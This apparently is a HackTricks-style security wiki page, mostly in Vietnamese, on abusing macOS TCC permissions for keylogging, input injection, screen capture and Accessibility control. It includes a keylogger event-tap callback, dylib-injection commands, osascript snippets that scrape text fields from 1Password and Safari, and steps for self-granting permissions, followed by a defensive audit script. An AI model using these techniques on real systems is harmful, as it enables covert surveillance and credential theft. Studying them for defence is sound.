# Lạm dụng Input Monitoring, Screen Capture & Accessibility trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Ba dịch vụ TCC liên quan kiểm soát cách ứng dụng quan sát và tương tác với phiên desktop của người dùng:

| Dịch vụ TCC | Quyền | Khả năng |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Đọc tất cả sự kiện bàn phím và chuột trên toàn hệ thống (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Chèn sự kiện bàn phím và chuột giả lập |
| `kTCCServiceScreenCapture` | **Screen Capture** | Đọc bộ đệm hiển thị, chụp ảnh màn hình, quay màn hình |
| `kTCCServiceAccessibility` | **Accessibility** | Điều khiển các ứng dụng khác thông qua API AXUIElement, đọc các phần tử giao diện người dùng |

Các quyền này là **tổ hợp nguy hiểm nhất trên macOS** — kết hợp lại, chúng cho phép:
- Keylogging toàn bộ thao tác gõ phím (mật khẩu, tin nhắn, thẻ tín dụng)
- Quay màn hình mọi nội dung đang hiển thị
- Chèn đầu vào giả lập (nhấp nút, chấp thuận hộp thoại)
- Toàn quyền điều khiển GUI, tương đương với quyền truy cập vật lý

---

## Input Monitoring (kTCCServiceListenEvent)

### Cách thức hoạt động

macOS sử dụng **API `CGEventTap`** để cho phép các tiến trình chặn sự kiện đầu vào từ hệ thống sự kiện Quartz. Tiến trình có quyền ListenEvent có thể tạo một event tap để nhận **mọi sự kiện bàn phím và chuột** trước hoặc sau khi chúng được chuyển đến ứng dụng đích.<sup>[[1]](#references)</sup>

```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
    kCGSessionEventTap,        // Tap at the session level (all apps)
    kCGHeadInsertEventTap,     // Insert before the event reaches the app
    kCGEventTapOptionListenOnly, // Listen only (don't modify events)
    mask,
    eventCallback,             // Callback receives every matching event
    NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
                         CGEventRef event, void *userInfo) {
    UniChar chars[4];
    UniCharCount len;
    CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
    // chars now contains what the user typed
    return event;
}
```

### Tìm các tệp nhị phân có entitlement

```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```

### Tấn công: Keylogging qua Code Injection

Nếu một binary có quyền ListenEvent cũng **tắt library validation** hoặc **cho phép các biến môi trường DYLD**, kẻ tấn công có thể inject một dylib đăng ký CGEventTap:

```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
  grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```

The injected dylib kế thừa quyền ListenEvent TCC của mục tiêu và ghi lại mọi phím được nhấn.

### Attack: Credential Harvesting

Một keylogger tinh vi có thể đối chiếu các phím được nhấn với ứng dụng đang hoạt động:

```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```

---

## Tiêm đầu vào (kTCCServicePostEvent)

### Cách thức hoạt động

Quyền PostEvent cho phép tạo event tap với **`kCGEventTapOptionDefault`** (có thể sửa đổi/tiêm sự kiện) thay vì ListenOnly.<sup>[[1]](#references)</sup> Điều này cho phép:

```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
                                           CGPointMake(100, 200),
                                           kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```

### Tấn công: Tự động phê duyệt lời nhắc TCC

Với PostEvent, kẻ tấn công có thể **mô phỏng thao tác nhấp vào "Allow"** trên các hộp thoại cấp quyền TCC:

```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```

---

## Chụp màn hình (kTCCServiceScreenCapture)

### Cách hoạt động

Quyền chụp màn hình cho phép đọc bộ đệm hiển thị bằng:
- **`CGWindowListCreateImage`** — chụp bất kỳ cửa sổ nào hoặc toàn màn hình
- **`ScreenCaptureKit`** (macOS 12.3+) — API hiện đại để truyền phát nội dung màn hình<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — chụp màn hình được tăng tốc bằng phần cứng

```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
    CGRectInfinite,
    kCGWindowListOptionOnScreenOnly,
    kCGNullWindowID,
    kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```

### Tìm các ứng dụng ghi màn hình

```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```

### Tấn công: Thu thập thông tin xác thực qua OCR

Một tiến trình chụp màn hình được inject có thể định kỳ chụp khung hình và dùng OCR để trích xuất mật khẩu:

```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```

> [!WARNING]
> Bắt đầu từ **macOS Sonoma**, thao tác chụp màn hình sẽ hiển thị **chỉ báo liên tục** trên thanh menu. Ở các phiên bản cũ hơn, việc quay màn hình có thể diễn ra hoàn toàn âm thầm. Tuy nhiên, người dùng vẫn có thể không nhận ra thao tác chụp một khung hình đơn lẻ trong thời gian ngắn.

### Tấn công: Ghi lại phiên

Quay màn hình liên tục cung cấp bản phát lại đầy đủ phiên làm việc của người dùng:

```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```

---

## Trợ năng (kTCCServiceAccessibility)

### Cách hoạt động

Quyền truy cập trợ năng cho phép điều khiển các ứng dụng khác thông qua **AXUIElement API**.<sup>[[2]](#references)</sup> Một tiến trình có quyền truy cập trợ năng có thể:

1. **Đọc** mọi phần tử giao diện người dùng trong bất kỳ ứng dụng nào (trường văn bản, nhãn, nút, menu)
2. **Nhấp** vào các nút và tương tác với các điều khiển
3. **Nhập** văn bản vào bất kỳ trường văn bản nào
4. **Điều hướng** menu và hộp thoại
5. **Thu thập** dữ liệu hiển thị từ bất kỳ ứng dụng nào đang chạy

```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```

### Tấn công: Tự cấp quyền TCC

Hành vi lạm dụng accessibility nguy hiểm nhất là **điều hướng trong System Settings để cấp thêm quyền cho malware của chính bạn**.<sup>[[4]](#references)</sup>

```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
    activate
    delay 1
end tell
tell application "System Events"
    tell process "System Settings"
        -- Navigate to Privacy & Security
        -- Click the lock to authenticate
        -- Toggle on Full Disk Access for the malware
    end tell
end tell'
```

### Attack: Thu thập dữ liệu xuyên ứng dụng

```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```

### Tấn công: Tự động hóa hành động của người dùng

```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
    tell process "Finder"
        click button "Allow" of window 1
    end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```

---

## Chuỗi tấn công

### Chuỗi: Giám sát đầu vào + Chụp màn hình = Giám sát toàn diện

```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```

### Chuỗi: Trợ năng + PostEvent = Toàn quyền điều khiển từ xa

```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```

### Chuỗi: Trợ năng → Tự cấp quyền Camera/Mic → Giám sát

```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```

---

## Phát hiện & Liệt kê

```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
  echo -e "\n[*] Database: $db"
  for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
    echo "  $svc:"
    sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
  done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
  AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```

## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — API trợ năng](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Sự kiện tổng hợp và bảo mật giao diện người dùng trên macOS](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
